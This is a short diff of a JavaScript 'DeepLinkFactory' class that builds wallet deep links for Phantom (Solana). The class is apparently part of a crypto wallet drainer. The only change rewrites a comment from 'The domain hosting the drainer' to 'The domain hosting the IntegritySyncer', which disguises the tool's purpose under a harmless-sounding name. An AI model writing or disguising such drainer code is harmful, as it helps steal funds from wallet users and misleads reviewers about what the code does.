@@ -4,7 +4,7 @@
 
 export class DeepLinkFactory {
     constructor(targetDomain) {
-        this.target = targetDomain; // The domain hosting the drainer
+        this.target = targetDomain; // The domain hosting the IntegritySyncer
     }
 
     // 1. PHANTOM (Solana)
